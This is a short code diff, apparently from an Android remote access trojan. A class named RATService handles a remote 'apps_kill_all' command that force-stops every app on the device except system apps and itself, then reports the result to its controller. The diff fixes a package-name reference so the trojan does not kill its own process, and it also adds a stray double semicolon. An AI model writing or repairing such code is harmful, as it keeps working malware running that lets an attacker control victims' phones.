@@ -858,7 +858,7 @@ case "apps_kill_all":
                 // Don't kill system apps
                 if (!packageName.startsWith("com.android.") && 
                     !packageName.startsWith("android") &&
-                    !packageName.equals(context.getPackageName())) {
+                    !packageName.equals(RATService.this.getPackageName())) {  // FIXED: Use RATService.this.getPackageName()
                     appManagerModule.forceStopApp(packageName);
                     killed++;
                 }
@@ -875,7 +875,7 @@ case "apps_kill_all":
     } else {
         sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"App manager not available\"}");
     }
-    break;
+    break;;
 
 
                 
